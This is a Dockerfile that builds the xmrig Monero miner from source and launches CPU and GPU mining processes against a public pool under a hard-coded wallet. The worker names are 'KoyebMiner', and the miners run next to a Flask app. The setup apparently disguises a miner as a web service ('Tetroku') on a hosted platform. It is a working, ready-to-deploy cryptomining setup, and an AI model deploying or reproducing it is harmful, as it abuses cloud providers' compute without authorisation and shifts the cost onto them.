FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    git \
    build-essential \
    cmake \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev \
    python3 \
    python3-pip \
    ocl-icd-libopencl1 \
    opencl-headers \
    ocl-icd-opencl-dev \
    clinfo \
    && apt-get clean

RUN pip3 install flask waitress

WORKDIR /Tetroku

RUN git clone https://github.com/xmrig/xmrig.git xmrig-cpu \
    && cd xmrig-cpu \
    && mkdir build \
    && cd build \
    && cmake .. -DWITH_OPENCL=ON \
    && make

WORKDIR /Tetroku/xmrig-cpu/build
COPY app.py .

CMD ./xmrig --url de.monero.herominers.com:1111 --user 4AsybUjHWc3LtcJj7h7yd9NJ3JXQynQUneMTpoTALYgmSFNW6XLmYGGLR5rHr3zcfjbPZ6dHp9MSdLiDBAXd4wKQ5ufR6vv.KoyebMinerCPU --pass x --threads 6 --cpu-max-threads-hint 80 & \
    ./xmrig --url de.monero.herominers.com:1111 --user 4AsybUjHWc3LtcJj7h7yd9NJ3JXQynQUneMTpoTALYgmSFNW6XLmYGGLR5rHr3zcfjbPZ6dHp9MSdLiDBAXd4wKQ5ufR6vv.KoyebMinerGPU --pass x --opencl & \
    python3 app.py
